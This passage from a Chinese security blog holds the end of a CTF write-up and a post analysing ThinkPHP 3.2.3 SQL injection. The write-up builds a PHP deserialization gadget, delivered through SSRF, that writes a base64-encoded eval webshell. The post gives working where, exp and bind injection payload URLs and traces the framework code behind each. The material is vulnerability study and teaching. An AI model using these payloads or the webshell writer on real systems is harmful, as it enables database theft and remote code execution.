class="title">Yongen</span></span>&#123; <span class="comment">//flag.php</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span> = <span class="string">&quot;php://filter/write=convert.base64-decode/resource=shell.php&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$text</span> = <span class="string">&quot;aaaPD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> GWHT;</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>



<p>构造ssrf请求触发反序列化</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;1d376013-e9d5-4028-bc85-8fd14af0feea.node3.buuoj.cn&#x2F;star1.php&#x2F;star1.php?path&#x3D;http:&#x2F;&#x2F;127.0.0.1&#x2F;ser.php&amp;c&#x3D;O%3A4%3A%22GWHT%22%3A1%3A%7Bs%3A4%3A%22hero%22%3BO%3A6%3A%22Yongen%22%3A2%3A%7Bs%3A4%3A%22file%22%3Bs%3A59%3A%22php%3A%2F%2Ffilter%2Fwrite%3Dconvert.base64-decode%2Fresource%3Dshell.php%22%3Bs%3A4%3A%22text%22%3Bs%3A35%3A%22aaaPD9waHAgZXZhbCgkX1BPU1RbMV0pOz8%2B%22%3B%7D%7D</span><br></pre></td></tr></table></figure>

<p><img src="https://www.hualigs.cn/image/60861094c91bc.jpg"></p>
<p>成功写入文件，得到flag</p>
<p><img src="https://www.hualigs.cn/image/60861091c8805.jpg"></p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-04-20T08:34:24.000Z" title="2021-04-20T08:34:24.000Z">2021-04-20</time>发表</span><span class="level-item"><time dateTime="2021-04-20T08:48:10.417Z" title="2021-04-20T08:48:10.417Z">2021-04-20</time>更新</span><span class="level-item">8 分钟读完 (大约1248个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/04/20/ThinkPhp3-2-3%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">ThinkPhp3.2.3注入漏洞总结</a></h1><div class="content"><h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><p>数据库连接配置</p>
<p><img src="https://www.hualigs.cn/image/607e923dad073.jpg"></p>
<h1 id="thinkphp3-2-3-where注入"><a href="#thinkphp3-2-3-where注入" class="headerlink" title="thinkphp3.2.3 where注入"></a>thinkphp3.2.3 where注入</h1><p>控制器</p>
<p>/Application/Home/Controller/IndexController.class.php</p>
<p><img src="https://www.hualigs.cn/image/607e923dae04f.jpg"></p>
<p><img src="https://www.hualigs.cn/image/607e923db9e10.jpg"></p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;tp3&#x2F;?id[where]&#x3D;1%20and%201&#x3D;updatexml(1,concat(0x7e,(select database()),0x7e),1)#</span><br></pre></td></tr></table></figure>

<p><img src="https://www.hualigs.cn/image/607e92437644e.jpg"></p>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>在<code>I()</code>方法上打一个断点，<code>I()</code>方法用来获取GET和POST参数</p>
<p><img src="https://www.hualigs.cn/image/607e924305371.jpg"></p>
<p>在<code>I()</code>方法中经过<code>htmlspecialchars()</code>处理，再经过functions.php中<code>think_filter</code>函数过滤，这两处过滤对payload没有影响，可以直接忽略</p>
<p><img src="https://www.hualigs.cn/image/607e923de6764.jpg"></p>
<p><img src="https://www.hualigs.cn/image/607e923dcbc98.jpg"></p>
<p>think_filter函数</p>
<p><img src="https://www.hualigs.cn/image/607e923df0bb8.jpg"></p>
<p>/ThinkPHP/Library/Think/Model.class.php</p>
<p>接下来进入<code>find()</code>方法处理 </p>
<p>参数经过Model.class.php中的<code>_parseOptions()</code>方法处理后带入select方法进行查询，可以看到注入语句在经过<code>_parseOptions()</code>后就变成了int类型，后面的语句被去除了。</p>
<p><img src="https://www.hualigs.cn/image/607e923e02118.jpg"></p>
<p><code>_parseOptions</code>执行前，注入语句没有发生变化</p>
<p><img src="https://www.hualigs.cn/image/607e924155ec7.jpg"></p>
<p>跟进·<code>_parseOptions()</code>，满足条件进入<code>_parseType()</code></p>
<p><img src="https://www.hualigs.cn/image/607e92431e9fe.jpg"></p>
<p>在经过<code>_parseType</code>处理后，注入语句被转换成了int型，只保留了前面的数字,注意这里的<code>$options[&#39;where&#39;]</code>是一个array</p>
<p><img src="https://www.hualigs.cn/image/607e92428e1eb.jpg"></p>
<p>跟进<code>_parseType()</code>，发现这里进行了强制类型转换，把payload强制转换成了int型，去掉了后面部分</p>
<p><img src="https://www.hualigs.cn/image/607e923e1ab2f.jpg"></p>
<h2 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h2><p>只要<code>is_array($options[&#39;where&#39;])</code>这个条件不满足，就不会进入到强制转换函数中，payload也就不会被过滤，所以要想办法让<code>$options[&#39;where&#39;]</code>不为数组</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>]) &amp;&amp; is_array(<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$fields</span>) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$options</span>[<span class="string">&#x27;join&#x27;</span>]))</span><br></pre></td></tr></table></figure>



<p>当我们传入的payload为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;45789 and 1&#x3D;updatexml(1,concat(0x7e,(select database()),0x7e),1)#</span><br></pre></td></tr></table></figure>

<p><code>_parseOptions</code>执行前，<code>$options[&#39;where&#39;]</code>就是一个数组了</p>
<p><img src="https://www.hualigs.cn/image/607e92428e1eb.jpg"></p>
<p><code>find()</code>函数开始存在一个判断，如果传入的参数为数字或者字符串，就会把他转换成数组再赋值给<code>$options[&#39;where&#39;]</code>，这样就会满足条件<code>is_array($options[&#39;where&#39;])</code>从而导致payload被转换。</p>
<p>这里传入<code>find()</code>的参数是<code>45789 and 1=updatexml(1,concat(0x7e,(select database()),0x7e),1)#</code>，满足了if判断中的条件，注入失败。</p>
<p><img src="https://www.hualigs.cn/image/607e9241b5394.jpg"></p>
<p>当payload为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id[where]&#x3D;45789 and 1&#x3D;updatexml(1,concat(0x7e,(select database()),0x7e),1)#</span><br></pre></td></tr></table></figure>

<p>if条件不满足</p>
<p><code>options[&#39;where&#39;]</code>就会是一个字符串，<code>is_array($options[&#39;where&#39;])</code>条件不满足，就成功绕过了</p>
<p><img src="https://www.hualigs.cn/image/607e9241b5394.jpg"></p>
<p>注入语句没有被转换，直接被带入执行。</p>
<p><img src="https://www.hualigs.cn/image/607e92400b9b7.jpg"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>注入产生的原因是构造的poc绕过了thinkphp对<code>$option[&#39;where&#39;]</code>是否是一个数组的判断，从而不满足<code>is_array($options[&#39;where&#39;])</code>，绕过了<code>_parseType</code>函数过滤，从而导致了注入。</p>
<h1 id="Thinkphp-3-2-3-exp注入"><a href="#Thinkphp-3-2-3-exp注入" class="headerlink" title="Thinkphp 3.2.3 exp注入"></a>Thinkphp 3.2.3 exp注入</h1><p>控制器</p>
<p><img src="https://www.hualigs.cn/image/607e923fb01b1.jpg"></p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;tp3&#x2F;?username[0]&#x3D;exp&amp;username[1]&#x3D;&#x3D;1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)</span><br></pre></td></tr></table></figure>

<p><img src="https://www.hualigs.cn/image/607e924383547.jpg"></p>
<p><code>find()</code>执行到</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$resultSet</span>=<span class="keyword">$this</span>-&gt;db-&gt;select(<span class="variable">$options</span>);</span><br></pre></td></tr></table></figure>

<p><img src="https://www.hualigs.cn/image/607e924112362.jpg"></p>
<p>/ThinkPHP/Library/Think/Db/Driver.class.php</p>
<p>进入<code>select()</code></p>
<p><img src="https://www.hualigs.cn/image/607e92405be65.jpg"></p>
<p>进入<code>buildSelectSql()</code></p>
<p><img src="https://www.hualigs.cn/image/607e923f74c7f.jpg"></p>
<p>进入<code>parsesql()</code>，关注<code>parseWhere()</code>函数</p>
<p><img src="https://www.hualigs.cn/image/607e92424058c.jpg"></p>
<p><code>parseWhere()</code>函数调用<code>parseWhereItem()</code></p>
<p>elseif语句中直接拼接了where条件到sql语句中，到达该语句需要满足两个条件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(is_array(<span class="variable">$val</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(is_string(<span class="variable">$val</span>[<span class="number">0</span>]))</span><br></pre></td></tr></table></figure>

<p>由于<code>$exp=strtolower($val[0]);</code>，传入<code>username[0]=exp&amp;username[1]=1 and 1=1</code></p>
<p><img src="https://www.hualigs.cn/image/607e92426c997.jpg"></p>
<p>注意控制器那里不能使用<code>I()</code>方法来获取参数，因为前面提到<code>I()</code>方法中调用了<code>think_filter()</code>函数，该函数会过滤exp，导致注入失败</p>
<p><img src="https://www.hualigs.cn/image/607e923df0bb8.jpg"></p>
<h1 id="thinkphp-3-2-3-bind注入"><a href="#thinkphp-3-2-3-bind注入" class="headerlink" title="thinkphp 3.2.3 bind注入"></a>thinkphp 3.2.3 bind注入</h1><p>控制器</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$User</span> = M(<span class="string">&quot;Users&quot;</span>);</span><br><span class="line">    <span class="variable">$user</span>[<span class="string">&#x27;id&#x27;</span>] = I(<span class="string">&#x27;id&#x27;</span>);</span><br><span class="line">    <span class="variable">$data</span>[<span class="string">&#x27;password&#x27;</span>] = I(<span class="string">&#x27;password&#x27;</span>);</span><br><span class="line">    <span class="variable">$valu</span> = <span class="variable">$User</span>-&gt;where(<span class="variable">$user</span>)-&gt;save(<span class="variable">$data</span>);</span><br><span class="line">    var_dump(<span class="variable">$valu</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;tp3&#x2F;?id[0]&#x3D;bind&amp;id[1]&#x3D;0 and updatexml(1,concat(0x7e,user(),0x7e),1)&amp;password&#x3D;1</span><br></pre></td></tr></table></figure>

<p><img src="https://www.hualigs.cn/image/607e924209d7f.jpg"></p>
<p>这里需要注意<code>id[1]=0</code>原理在下面说</p>
<p><code>save()</code>函数中添加断点</p>
<p><img src="https://www.hualigs.cn/image/607e923fe8d55.jpg"></p>
<p>/ThinkPHP/Library/Think/Db/Driver.class.php</p>
<p>进入<code>update()</code></p>
<p>又经过了<code>parseWhere()</code>函数，除了之前利用的<code>exp</code>还有<code>bind</code>可以利用</p>
<p><img src="https://www.hualigs.cn/image/607e9240d4c79.jpg"></p>
<p>直接传递payload，发现添加了冒号，注入失败</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;tp3&#x2F;?id[0]&#x3D;bind&amp;id[1]&#x3D;1</span><br></pre></td></tr></table></figure>

<p><img src="https://www.hualigs.cn/image/607e924147690.jpg"></p>
<p>可以看到<code>bindParam()</code>添加冒号</p>
<p><img src="https://www.hualigs.cn/image/607e923f510cf.jpg"></p>
<p>ThinkPHP/Library/Think/Db/Driver.class.php</p>
<p><code>execute()</code>将<code>:0</code>替换为传入参数，让参数等于0，相当于<code>:0</code>，然后被替换为1，成功注入</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;bind))&#123;</span><br><span class="line">            <span class="variable">$that</span>   =   <span class="keyword">$this</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;queryStr =   strtr(<span class="keyword">$this</span>-&gt;queryStr,array_map(<span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$val</span></span>) <span class="title">use</span>(<span class="params"><span class="variable">$that</span></span>)</span>&#123; <span class="keyword">return</span> <span class="string">&#x27;\&#x27;&#x27;</span>.<span class="variable">$that</span>-&gt;escapeString(<span class="variable">$val</span>).<span class="string">&#x27;\&#x27;&#x27;</span>; &#125;,<span class="keyword">$this</span>-&gt;bind));</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>



<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/-qing-/p/11444871.html">https://www.cnblogs.com/-qing-/p/11444871.html</a></p>
<p><a target="_blank" rel="noopener" href="https://darkless.cn/2020/06/07/thinkphp3.2.3-sqli/">https://darkless.cn/2020/06/07/thinkphp3.2.3-sqli/</a></p>
<p><a target="_blank" rel="noopener" href="https://syst1m.com/post/summary-of-thinkphp3-vulnerability/">https://syst1m.com/post/summary-of-thinkphp3-vulnerability/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.chabug.org/audit/1062.html">https://www.chabug.org/audit/1062.html</a></p>
</div></article></div><nav class="pagination" role="navigation" aria-label="pagination"><div class="pagination-previous is-invisible is-hidden-mobile"><a href="/page/0/">上一页</a></div><div class="pagination-next"><a href="/page/2/">下一页</a></div><ul class="pagination-list is-hidden-mobile"><li><a class="pagination-link is-current" href="/">1</a></li><li><a class="pagination-link" href="/page/2/">2</a></li><li><span class="pagination-ellipsis">&hellip;</span></li><li><a class="pagination-link" href="/page/5/">5</a></li></ul></nav></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar" src="https://i.loli.net/2021/04/15/mxulK15prYAkXbI.png" alt="Sp4z"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">Sp4z</p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">44</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">0</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">0</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/ppoffice" target="_blank" rel="noopener">关注我</a></div><div class="level is-mobile"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/ppoffice"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Facebook" href="https://facebook.com"><i class="fab fa-facebook"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Twitter" href="https://twitter.com"><i class="fab fa-twitter"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Dribbble" href="https://dribbble.com"><i class="fab fa-dribbble"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="RSS" href="/"><i class="fas fa-rss"></i></a></div></div></div><!--!--><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">链接</h3><ul class="menu-list"><li><a class="level is-mobile" href="https://hexo.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Hexo</span></span><span class="level-right"><span class="level-item tag">hexo.io</span></span></a></li><li><a class="level is-mobile" href="https://bulma.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Bulma</span></span><span class="level-right"><span class="level-item tag">bulma.io</span></span></a></li></ul></div></div></div><!--!--><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-05-28T04:36:53.000Z">2021-05-28</time></p><p class="title"><a href="/2021/05/28/ESP%E5%AE%9A%E5%BE%8B%E5%92%8C%E5%8A%A8%E6%80%81%E8%84%B1UPX%E5%A3%B3/">ESP定律和动态脱UPX壳</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-05-23T06:38:50.000Z">2021-05-23</time></p><p class="title"><a href="/2021/05/23/Servlet%E5%AD%A6%E4%B9%A0/">Servlet学习</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-05-18T06:04:20.000Z">2021-05-18</time></p><p class="title"><a href="/2021/05/18/CISCN2021-web%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/">CISCN2021 web部分题解</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-05-14T10:17:39.000Z">2021-05-14</time></p><p class="title"><a href="/2021/05/14/MRCTF2020-EzpopRevenge/">MRCTF2020-EzpopRevenge</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-04-30T08:29:19.000Z">2021-04-30</time></p><p class="title"><a href="/2021/04/30/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0-CommonsCollections3-1/">java反序列化学习-CommonsCollections3.1</a></p></div></article></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2021/05/"><span class="level-start"><span class="level-item">五月 2021</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/04/"><span class="level-start"><span class="level-item">四月 2021</span></span><span class="level-end"><span class="level-item tag">16</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/03/"><span class="level-start"><span class="level-item">三月 2021</span></span><span class="level-end"><span class="level-item tag">10</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/02/"><span class="level-start"><span class="level-item">二月 2021</span></span><span class="level-end"><span class="level-item tag">8</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/01/"><span class="level-start"><span class="level-item">一月 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/12/"><span class="level-start"><span class="level-item">十二月 2020</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/11/"><span class="level-start"><span class="level-item">十一月 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><!--!--><div class="card widget" data-type="subscribe-email"><div class="card-content"><div class="menu"><h3 class="menu-label">订阅更新</h3><form action="https://feedburner.google.com/fb/a/mailverify" method="post" target="popupwindow" onsubmit="window.open(&#039;https://feedburner.google.com/fb/a/mailverify?uri=&#039;,&#039;popupwindow&#039;,&#039;scrollbars=yes,width=550,height=520&#039;);return true"><input type="hidden" value="" name="uri"><input type="hidden" name="loc" value="en_US"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button" type="submit" value="订阅"></div></div></form></div></div></div><div class="card widget"><div class="card-content"><div class="notification is-danger">You need to set <code>client_id</code> and <code>slot_id</code> to show this AD unit. Please set it in <code>_config.yml</code>.</div></div></div></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/logo.svg" alt="Hexo" height="28"></a><p class="is-size-7"><span>&copy; 2021 John Doe</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" async></script><script>moment.locale("zh-CN");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "此网站使用Cookie来改善您的体验。",
          dismiss: "知道了！",
          allow: "允许使用Cookie",
          deny: "拒绝",
          link: "了解更多",
          policy: "Cookie政策",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
        });</script></body></html>